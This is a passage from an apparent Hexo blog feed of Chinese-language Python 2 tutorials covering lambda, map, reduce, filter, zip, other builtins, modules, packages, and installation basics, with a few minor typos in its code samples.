&apos;ad&apos;</span><br><span class="line">def  getit():</span><br><span class="line">        global a</span><br><span class="line">        a = &apos;look&apos;</span><br><span class="line">        print &quot;this a is&quot;,a</span><br><span class="line">demo()</span><br><span class="line">print &quot;---------------&quot;</span><br><span class="line">print &quot;this a is&quot;,a</span><br></pre></td></tr></table></figure></p><h1 id="特殊函数"><a href="#特殊函数" class="headerlink" title="特殊函数"></a>特殊函数</h1><h3 id="lambda函数"><a href="#lambda函数" class="headerlink" title="lambda函数"></a>lambda函数</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">def add(x,y):</span><br><span class="line">      a = x+y</span><br><span class="line">      print a</span><br><span class="line"></span><br><span class="line">add（3,5）</span><br></pre></td></tr></table></figure><p>引入lambda函数<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">add = lambda  x,y  :  x+y</span><br><span class="line"></span><br><span class="line">add( 3,5 )</span><br></pre></td></tr></table></figure></p><p>lambda函数是一个只用一行就能解决问题的函数。</p><h5 id="lambda函数的使用方法："><a href="#lambda函数的使用方法：" class="headerlink" title="lambda函数的使用方法："></a>lambda函数的使用方法：</h5><p>在lambda函数后面直接加变量，变量后直接冒号，冒号后面是表达式，完美解决<br>来个表达式</p><p>lambda arg1,arg2,….,argn : expression using arguments</p><h3 id="map函数"><a href="#map函数" class="headerlink" title="map函数"></a>map函数</h3><h5 id="使用方法：-map-函数，序列对象"><a href="#使用方法：-map-函数，序列对象" class="headerlink" title="使用方法： map(函数，序列对象)"></a>使用方法： map(函数，序列对象)</h5><p>比如0-100的平方数<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">numbers = range(101)</span><br><span class="line"></span><br><span class="line">map( lambda  x :  x**2,numbers)</span><br></pre></td></tr></table></figure></p><p>另一个方法 <code>[ x**2  for  x  in  numbers ]</code></p><h3 id="reduce函数"><a href="#reduce函数" class="headerlink" title="reduce函数"></a>reduce函数</h3><p>reduce()函数也是Python内置的一个高阶函数。</p><p>reduce()函数接收的参数和 map()类似，一个函数 f，一个list，但行为和 map()不同，reduce()传入的函数 f 必须接收两个参数，reduce()对list的每个元素反复调用函数f，并返回最终结果值。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">def f(x, y):</span><br><span class="line">    return x + y</span><br></pre></td></tr></table></figure></p><p>调用 <strong>reduce(f, [1, 3, 5, 7, 9])</strong>时，reduce函数将做如下计算：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">先计算头两个元素：f(1, 3)，结果为4；</span><br><span class="line">再把结果和第3个元素计算：f(4, 5)，结果为9；</span><br><span class="line">再把结果和第4个元素计算：f(9, 7)，结果为16；</span><br><span class="line">再把结果和第5个元素计算：f(16, 9)，结果为25；</span><br><span class="line">由于没有更多的元素了，计算结束，返回结果25。</span><br></pre></td></tr></table></figure></p><p>reduce()还可以接收第3个可选参数，作为计算的初始值。如果把初始值设为100，计算：</p><p>reduce(f, [1,3,5,7,9], 100)</p><p>结果将变为125，因为第一轮计算是：</p><p>计算初始值和第一个元素：f(100, 1)，结果为101。</p><h3 id="filter函数-过滤器"><a href="#filter函数-过滤器" class="headerlink" title="filter函数:过滤器"></a>filter函数:过滤器</h3><h5 id="用法：filter-函数-序列对象"><a href="#用法：filter-函数-序列对象" class="headerlink" title="用法：filter(函数,序列对象)"></a>用法：filter(函数,序列对象)</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">numbers = range(-2,11)</span><br><span class="line"></span><br><span class="line">print   numbers</span><br><span class="line"></span><br><span class="line">[-2, -1, 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10]</span><br><span class="line"></span><br><span class="line">filter( lambda x:x&gt;5,numbers)</span><br><span class="line"></span><br><span class="line">[6, 7, 8, 9, 10]</span><br></pre></td></tr></table></figure><h3 id="zip函数"><a href="#zip函数" class="headerlink" title="zip函数"></a>zip函数</h3><p>zip()是Python的一个内建函数，它接受一系列可迭代的对象作为参数，将对象中对应的元素打包成一个个tuple（元组），然后返回由这些tuples组成的list（列表）。若传入参数的长度不等，则返回list的长度和参数中长度最短的对象相同。利用*号操作符，可以将list unzip（解压）。</p><p>比如：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">a = [1,2,3]</span><br><span class="line"></span><br><span class="line">b = [4,5,6]</span><br><span class="line"></span><br><span class="line"> zip(a,b)</span><br><span class="line"></span><br><span class="line">[(1, 4), (2, 5), (3, 6)]</span><br></pre></td></tr></table></figure></p><h5 id="长度不等时，取长度最小的"><a href="#长度不等时，取长度最小的" class="headerlink" title="长度不等时，取长度最小的"></a>长度不等时，取长度最小的</h5><p>c = ‘HELL0’</p><p> d = ‘look’</p><p>zip(c,d)</p><p>[(‘H’, ‘l’), (‘E’, ‘o’), (‘L’, ‘o’), (‘L’, ‘k’)</p><h5 id="常用的是构造字典"><a href="#常用的是构造字典" class="headerlink" title="常用的是构造字典"></a>常用的是构造字典</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">url1 =  [&apos;a&apos;,&apos;b&apos;,&apos;c&apos;]</span><br><span class="line"></span><br><span class="line">url2 =  [&apos;d&apos;,&apos;e&apos;,&apos;f&apos;]</span><br><span class="line"></span><br><span class="line">url3 =  zip(url1,url2)</span><br></pre></td></tr></table></figure><h3 id="abs函数"><a href="#abs函数" class="headerlink" title="abs函数"></a>abs函数</h3><h5 id="abs-函数返回数字的绝对值。"><a href="#abs-函数返回数字的绝对值。" class="headerlink" title="abs() 函数返回数字的绝对值。"></a>abs() 函数返回数字的绝对值。</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/python</span><br><span class="line"></span><br><span class="line">print &quot;abs(-45) : &quot;, abs(-45)</span><br><span class="line">print &quot;abs(100.12) : &quot;, abs(100.12)</span><br><span class="line">print &quot;abs(119L) : &quot;, abs(119L)</span><br></pre></td></tr></table></figure><p>输出结果：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">abs(-45) :  45</span><br><span class="line">abs(100.12) :  100.12</span><br><span class="line">abs(119L) :  119</span><br></pre></td></tr></table></figure></p><h3 id="divmod-函数"><a href="#divmod-函数" class="headerlink" title="divmod() 函数"></a>divmod() 函数</h3><p>python divmod() 函数把除数和余数运算结果结合起来，返回一个包含商和余数的元组(a // b, a % b)。</p><h5 id="divmod-a-b"><a href="#divmod-a-b" class="headerlink" title="divmod(a, b)"></a>divmod(a, b)</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">divmod(7, 2)</span><br><span class="line"></span><br><span class="line">(3, 1)</span><br><span class="line"></span><br><span class="line">divmod(8, 2)</span><br><span class="line"></span><br><span class="line">(4, 0)</span><br></pre></td></tr></table></figure><h3 id="input-函数"><a href="#input-函数" class="headerlink" title="input() 函数"></a>input() 函数</h3><p>Python3.x 中 input() 函数接受一个标准输入数据，返回为 string 类型。</p><p>Python2.x 中 input() 相等于 eval(raw_input(prompt)) ，用来获取控制台的输入。</p><p>注意：input() 和 raw_input() 这两个函数均能接收 字符串 ，但 raw_input() 直接读取控制台的输入（任何类型的输入它都可以接收）除非对 input() 有特别需要，否则一般情况下推荐使用 raw_input() 来与用户交互。</p><h5 id="input-prompt"><a href="#input-prompt" class="headerlink" title="input([prompt])"></a>input([prompt])</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">a = input(&quot;input:&quot;)</span><br><span class="line"></span><br><span class="line">input:123  </span><br><span class="line"></span><br><span class="line">type(a)   </span><br><span class="line"></span><br><span class="line">type &apos;int&apos;</span><br></pre></td></tr></table></figure><h3 id="open-函数"><a href="#open-函数" class="headerlink" title="open() 函数"></a>open() 函数</h3><p>open() 函数用于打开一个文件，创建一个 file 对象，相关的方法才可以调用它进行读写。</p><h5 id="open（“-name”-”mode”）"><a href="#open（“-name”-”mode”）" class="headerlink" title="open（“$name”,”mode”）"></a>open（“$name”,”mode”）</h5><h5 id="file-对象方法"><a href="#file-对象方法" class="headerlink" title="file 对象方法"></a>file 对象方法</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">file.read([size]) size未指定则返回整个文件,如果文件大小&gt;2倍内存则有问题.f.read()读到文件尾时返回&quot;&quot;(空字串)</span><br><span class="line"></span><br><span class="line">file.readline() 返回一行</span><br><span class="line"></span><br><span class="line">file.readlines([size]) 返回包含size行的列表,size 未指定则返回全部行</span><br><span class="line"></span><br><span class="line">for line in f: print line #通过循环访问</span><br><span class="line"></span><br><span class="line">f.write(&quot;hello\n&quot;) #如果要写入字符串以外的数据,先将他转换为字符串.</span><br><span class="line"></span><br><span class="line">f.tell() 返回一个整数,表示当前文件指针的位置(就是到文件头的比特数).</span><br><span class="line"></span><br><span class="line">f.close() 关闭文件</span><br></pre></td></tr></table></figure><h3 id="staticmethod-函数"><a href="#staticmethod-函数" class="headerlink" title="staticmethod() 函数"></a>staticmethod() 函数</h3><p>python staticmethod 返回函数的静态方法。</p><p>该方法不强制要求传递参数</p><h3 id="all-函数"><a href="#all-函数" class="headerlink" title="all() 函数"></a>all() 函数</h3><p>all() 函数用于判断给定的可迭代参数 iterable 中的所有元素是否都为 TRUE，如果是返回 True，否则返回 False。</p><p>元素除了是 0、空、FALSE 外都算 TRUE。iterable – 元组或列表。</p><h5 id="比如"><a href="#比如" class="headerlink" title="比如"></a>比如</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">all([&apos;a&apos;, &apos;b&apos;, &apos;c&apos;, &apos;d&apos;])  # 列表list，元素都不为空或0</span><br><span class="line"></span><br><span class="line">True</span><br><span class="line"></span><br><span class="line">all([&apos;a&apos;, &apos;b&apos;, &apos;&apos;, &apos;d&apos;])   # 列表list，存在一个为空的元素</span><br><span class="line"></span><br><span class="line">False</span><br><span class="line"></span><br><span class="line">all((0, 1, 2, 3))          # 元组tuple，存在一个为0的元素</span><br><span class="line"></span><br><span class="line">False</span><br><span class="line"></span><br><span class="line"> all([])             # 空列表</span><br><span class="line"></span><br><span class="line">True </span><br><span class="line"></span><br><span class="line">all(())             # 空元组</span><br><span class="line"></span><br><span class="line">True</span><br></pre></td></tr></table></figure><h3 id="enumerate-函数"><a href="#enumerate-函数" class="headerlink" title="enumerate() 函数"></a>enumerate() 函数</h3><p>enumerate() 函数用于将一个可遍历的数据对象(如列表、元组或字符串)组合为一个索引序列，同时列出数据和数据下标，一般用在 for 循环当中。</p><p>比如<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">seasons = [&apos;Spring&apos;, &apos;Summer&apos;, &apos;Fall&apos;, &apos;Winter&apos;]</span><br><span class="line"></span><br><span class="line">list(enumerate(seasons))</span><br><span class="line"></span><br><span class="line">[(0, &apos;Spring&apos;), (1, &apos;Summer&apos;), (2, &apos;Fall&apos;), (3, &apos;Winter&apos;)]</span><br><span class="line"></span><br><span class="line">list(enumerate(seasons, start=1))       # 小标从 1 开始</span><br><span class="line">[(1, &apos;Spring&apos;), (2, &apos;Summer&apos;), (3, &apos;Fall&apos;), (4, &apos;Winter&apos;)]</span><br></pre></td></tr></table></figure></p><h3 id="tuple-方法"><a href="#tuple-方法" class="headerlink" title="tuple()方法"></a>tuple()方法</h3><p>元组 tuple() 函数将列表转换为元组。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">tuple(&#123;1:2,3:4&#125;)    #针对字典 会返回字典的key组成的tuple</span><br><span class="line"></span><br><span class="line">(1, 3)</span><br><span class="line"></span><br><span class="line">tuple([1,2,3,4])</span><br><span class="line"></span><br><span class="line">(1, 2, 3, 4)</span><br></pre></td></tr></table></figure></p><h3 id="compile-函数"><a href="#compile-函数" class="headerlink" title="compile() 函数"></a>compile() 函数</h3><p>compile() 函数将一个字符串编译为字节代码。</p><h5 id="返回值-1"><a href="#返回值-1" class="headerlink" title="返回值"></a>返回值</h5><p>返回表达式执行结果。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">str = &quot;3 * 4 + 5&quot;</span><br><span class="line"></span><br><span class="line">a = compile(str,&apos;&apos;,&apos;eval&apos;)</span><br><span class="line"></span><br><span class="line">eval(a)</span><br></pre></td></tr></table></figure></p><h3 id="dict-函数"><a href="#dict-函数" class="headerlink" title="dict() 函数"></a>dict() 函数</h3><p>dict() 函数用于创建一个字典。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">dict()                        # 创建空字典</span><br><span class="line"></span><br><span class="line"> dict(a=&apos;a&apos;, b=&apos;b&apos;, t=&apos;t&apos;)     # 传入关键字</span><br><span class="line"></span><br><span class="line">dict(zip([&apos;one&apos;, &apos;two&apos;, &apos;three&apos;], [1, 2, 3]))   # 映射函数方式来构造字典</span><br><span class="line"></span><br><span class="line">&#123;&apos;three&apos;: 3, &apos;two&apos;: 2, &apos;one&apos;: 1&#125; </span><br><span class="line"></span><br><span class="line">dict([(&apos;one&apos;, 1), (&apos;two&apos;, 2), (&apos;three&apos;, 3)])    # 可迭代对象方式来构造字典</span><br><span class="line"></span><br><span class="line">&#123;&apos;three&apos;: 3, &apos;two&apos;: 2, &apos;one&apos;: 1&#125;</span><br></pre></td></tr></table></figure></p><h3 id="file函数"><a href="#file函数" class="headerlink" title="file函数"></a>file函数</h3><p><strong>file()</strong> 函数用于创建一个 file 对象，它有一个别名叫open()<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">f = file(&apos;test.txt&apos;)</span><br><span class="line"></span><br><span class="line">f.read()</span><br><span class="line"></span><br><span class="line">&apos;RUNOOB1\nRUNOOB2\n&apos;</span><br></pre></td></tr></table></figure></p><h1 id="模块"><a href="#模块" class="headerlink" title="模块"></a>模块</h1><p>在Python中有一个概念叫做模块（module），这个和C语言中的头文件以及Java中的包很类似，比如在Python中要调用sqrt函数，必须用import关键字引入math这个模块</p><h3 id="如何引入模块"><a href="#如何引入模块" class="headerlink" title="如何引入模块"></a>如何引入模块</h3><p>四种方法：</p><h5 id="导入整个模块"><a href="#导入整个模块" class="headerlink" title="导入整个模块"></a>导入整个模块</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">import sys</span><br><span class="line"></span><br><span class="line">print sys.argv</span><br></pre></td></tr></table></figure><h5 id="只导入我们要用到的"><a href="#只导入我们要用到的" class="headerlink" title="只导入我们要用到的"></a>只导入我们要用到的</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">from sys import argv</span><br><span class="line"></span><br><span class="line">print argv</span><br></pre></td></tr></table></figure><h5 id="模块名太长，可以起个别名"><a href="#模块名太长，可以起个别名" class="headerlink" title="模块名太长，可以起个别名"></a>模块名太长，可以起个别名</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">import sys as s</span><br><span class="line"></span><br><span class="line">print s.argv</span><br></pre></td></tr></table></figure><h5 id="从模块中导入所有"><a href="#从模块中导入所有" class="headerlink" title="从模块中导入所有"></a>从模块中导入所有</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">from sys import *</span><br><span class="line"></span><br><span class="line">print path #输出sys模块中的path</span><br></pre></td></tr></table></figure><h5 id="定义一个自己的模块"><a href="#定义一个自己的模块" class="headerlink" title="定义一个自己的模块"></a>定义一个自己的模块</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">在目录下创建一个myself.py作为模块</span><br><span class="line"></span><br><span class="line">#encoding=utf-8</span><br><span class="line">a =  &quot;just do it&quot;</span><br></pre></td></tr></table></figure><p>接下来，创建一个py，引入这个模块<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">#encoding=utf-8</span><br><span class="line"></span><br><span class="line">import myself</span><br><span class="line">print myself.a</span><br></pre></td></tr></table></figure></p><p>如果在不同目录下，就要用到sys模块<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"> import sys</span><br><span class="line"></span><br><span class="line">sys.path.append(&quot;C:\Users\20148\Desktop\myself.py&quot;)</span><br></pre></td></tr></table></figure></p><p>用这种方法告诉Python解释器，我写的文件在哪里</p><p>可以将myself.py改造为：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">#coding = utf-8</span><br><span class="line"></span><br><span class="line">def  a():</span><br><span class="line">        return &quot;just  do it!!!&quot;</span><br><span class="line"></span><br><span class="line">if ____name__ _== &apos;__main__&apos;:</span><br><span class="line">        print  a()</span><br></pre></td></tr></table></figure></p><p>都是一个文件，我们可以把他当作程序执行，也可以当作模块引入</p><p>如果是程序执行的话，<code>__name__==&quot;__main__&quot;</code></p><p>如果是模块呢？<code>demo.__name__==“demo”</code>，即为模块的名称</p><p>如果是模块的引入，就不用写<code>if __name==&quot;__main__&quot;</code>了</p><h1 id="包and库"><a href="#包and库" class="headerlink" title="包and库"></a>包and库</h1><p>包(带 <strong>init</strong>.py 的文件夹)，一个包（就是熟悉的目录）里面有好多的模块（即为.py文件），库就更大了，一个Python的标准库有好多的包，包又有一堆的模块</p><p>建立一个叫gooann的目录，里面放两个py文件，一个a.py，一个b.py，再建立一个空文件<strong>init</strong>.py<br>a.py源码如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">#coding = utf-8</span><br><span class="line"></span><br><span class="line">def  a():</span><br><span class="line">        print &apos;just  do it!!!&apos;</span><br></pre></td></tr></table></figure></p><p>b.py源码如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">#coding = utf-8</span><br><span class="line"></span><br><span class="line">def  b():</span><br><span class="line">        print &apos;hello world!!&apos;</span><br></pre></td></tr></table></figure></p><p>然后，在与gooann同级的目录中，创建一个c.py调用这个gooann的包<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">#coding = utf-8</span><br><span class="line"></span><br><span class="line">import  gooann.a</span><br><span class="line">import  gooann.b</span><br><span class="line"></span><br><span class="line">gooann.a.a( )</span><br><span class="line"></span><br><span class="line">gooann.b.b( )</span><br></pre></td></tr></table></figure></p>]]></content>
    
    <summary type="html">
    
      &lt;hr&gt;
    
    </summary>
    
      <category term="Python" scheme="http://yoursite.com/categories/Python/"/>
    
    
      <category term="Python" scheme="http://yoursite.com/tags/Python/"/>
    
  </entry>
  
  <entry>
    <title>人生苦短，Python当歌-1</title>
    <link href="http://yoursite.com/2018/08/15/%E4%BA%BA%E7%94%9F%E8%8B%A6%E7%9F%AD%EF%BC%8CPython%E5%BD%93%E6%AD%8C-1/"/>
    <id>http://yoursite.com/2018/08/15/人生苦短，Python当歌-1/</id>
    <published>2018-08-15T07:25:45.000Z</published>
    <updated>2018-08-15T12:44:11.792Z</updated>
    
    <content type="html"><![CDATA[<hr><a id="more"></a><p>繁华一场梦</p><p><img src="\images\pasted-95.png" alt="upload successful"></p><h1 id="什么是Python"><a href="#什么是Python" class="headerlink" title="什么是Python"></a>什么是Python</h1><p>Python是一种面向对象、解释型计算机程序设计语言，Python语法简洁而清晰，具有丰富和强大的类库。它常被昵称为胶水语言，能够把用其他语言制作的各种模块(尤其是C/C++)很轻松地联结在一起。常见的一种应用情形是，使用Python快速生成程序的原型(有时甚至是程序的最终界面)，然后对其中有特别要求的部分，用更合适的语言改写</p><h1 id="Pyhton的安装"><a href="#Pyhton的安装" class="headerlink" title="Pyhton的安装"></a>Pyhton的安装</h1><p>Python官网：<a href="http://www.python.org/" target="_blank" rel="noopener">http://www.python.org/</a><br>Python文档下载地址：<a href="http://www.python.org/doc/" target="_blank" rel="noopener">www.python.org/doc/</a></p><h4 id="Unix-amp-Linux-平台安装-Python"><a href="#Unix-amp-Linux-平台安装-Python" class="headerlink" title="Unix &amp; Linux 平台安装 Python:"></a>Unix &amp; Linux 平台安装 Python:</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">打开WEB浏览器访问http://www.python.org/download/</span><br><span class="line">选择适用于Unix/Linux的源码压缩包。</span><br><span class="line">下载及解压压缩包。</span><br><span class="line">如果你需要自定义一些选项修改Modules/Setup</span><br><span class="line">执行 ./configure 脚本</span><br><span class="line">make</span><br><span class="line">make install</span><br></pre></td></tr></table></figure><p>执行以上操作后，Python会安装在 /usr/local/bin 目录中，Python库安装在/usr/local/lib/pythonXX，XX为你使用的Python的版本号。 </p><h4 id="Window-平台安装-Python"><a href="#Window-平台安装-Python" class="headerlink" title="Window 平台安装 Python:"></a>Window 平台安装 Python:</h4><p>打开WEB浏览器访问<a href="http://www.python.org/download/" target="_blank" rel="noopener">http://www.python.org/download/</a><br>在下载列表中选择Window平台安装包，包格式为：python-XYZ.msi 文件 ， XYZ 为你要安装的版本号。<br>要使用安装程序 python-XYZ.msi, Windows系统必须支持Microsoft Installer 2.0搭配使用。只要保存安装文件到本地计算机，然后运行它，看看你的机器支持MSI。Windows XP和更高版本已经有MSI，很多老机器也可以安装MSI。<br>下载后，双击下载包，进入Python安装向导，安装非常简单，你只需要使用默认的设置一直点击”下一步”直到安装完成即可。</p><h1 id="环境变量的设置"><a href="#环境变量的设置" class="headerlink" title="环境变量的设置"></a>环境变量的设置</h1><h4 id="Unix-Linux-设置环境变量"><a href="#Unix-Linux-设置环境变量" class="headerlink" title="Unix/Linux 设置环境变量"></a>Unix/Linux 设置环境变量</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">bash shell下：export PATH=&quot;$PATH:/usr/local/bin/python&quot;</span><br><span class="line"></span><br><span class="line">sh、ksh shell 下：PATH=&quot;$PATH:/usr/local/bin/python&quot;</span><br><span class="line"></span><br><span class="line">csh   shell 下：  setenv PATH &quot;$PATH:/usr/local/bin/python&quot;</span><br></pre></td></tr></table></figure><h4 id="windows下环境变量设置"><a href="#windows下环境变量设置" class="headerlink" title="windows下环境变量设置"></a>windows下环境变量设置</h4><p><code>cmd下：输入path=%path%;$python的安装目录</code></p><h1 id="Python基础"><a href="#Python基础" class="headerlink" title="Python基础"></a>Python基础</h1><p>笔者安装的为Python2.7.14，以下均基于此版本</p><p>首先打开终端输入python即可打开终端解释器：</p><p>先来个hello  world  </p><p><code>print  “hello  world”</code></p><p>Python 可以使用引号( <strong>‘</strong> )、双引号( <strong>“</strong> )、三引号( <strong>‘’’</strong> 或 <strong>“””</strong> ) 来表示字符串，引号的开始与结束必须的相同类型的。其中三引号可以由多行组成，编写多行文本的快捷语法，常用于文档字符串，在文件的特定地点，被当做注释。</p><p> <code>tpye()</code> :查看变量类型</p><p><code>len( )</code>: 查看字符串的长度</p><h3 id="字符串"><a href="#字符串" class="headerlink" title="字符串"></a>字符串</h3><p>因为我们主要是用python写爬虫，所以字符串是必须学好的，主要对字符串进行索引、切片和取长度的操作<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">s = &quot; believe  yourself , just do  it&quot;</span><br><span class="line"></span><br><span class="line">s[10]         &apos;o&apos;</span><br><span class="line"></span><br><span class="line">s[10:]        &apos;ourself , just do  it&apos;</span><br><span class="line"></span><br><span class="line">s[0:10]      &apos;believe  yo&apos;</span><br><span class="line"></span><br><span class="line">s[::-1]       把字符串倒过来</span><br></pre></td></tr></table></figure></p><p>【x:y:z]切片索引,x是左端,y是右端,z是步长,在[x,y)区间从左到右每隔z取值,默认z为1可以省略z参数.  步长的负号就是反向,从右到左取值. </p><p>合并字符串，用  +  号</p><h5 id="Unicode-字符串"><a href="#Unicode-字符串" class="headerlink" title="Unicode 字符串"></a>Unicode 字符串</h5><p>Python 中定义一个 Unicode 字符串和定义一个普通字符串一样简单：</p><p><code>u&#39;Hello World !&#39;</code></p><h5 id="以-encoding-指定的编码格式解码-string"><a href="#以-encoding-指定的编码格式解码-string" class="headerlink" title="以 encoding 指定的编码格式解码 string"></a>以 encoding 指定的编码格式解码 string</h5><p>string.decode(encoding=’UTF-8’, errors=’strict’)</p><h3 id="list列表"><a href="#list列表" class="headerlink" title="list列表[ ]"></a>list列表[ ]</h3><p>可以对列表进行字符串同样的操作，把字符串转换为列表 <code>list =  str.split( )</code></p><p>在列表末尾添加新的对象 ：append（）</p><p>移除列表中某个值的第一个匹配项 ：remove（）</p><p>将元组转换为列表 ：    list(seq)</p><p>必会的help函数：help（）</p><p>help函数查看python模块中函数的用法</p><h3 id="元组-（）"><a href="#元组-（）" class="headerlink" title="元组 （）"></a>元组 （）</h3><p>Python的元组与列表类似，不同之处在于元组的元素不能修改。</p><p>元组中的元素值是不允许删除的，但我们可以使用del语句来删除整个元组<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/python</span><br><span 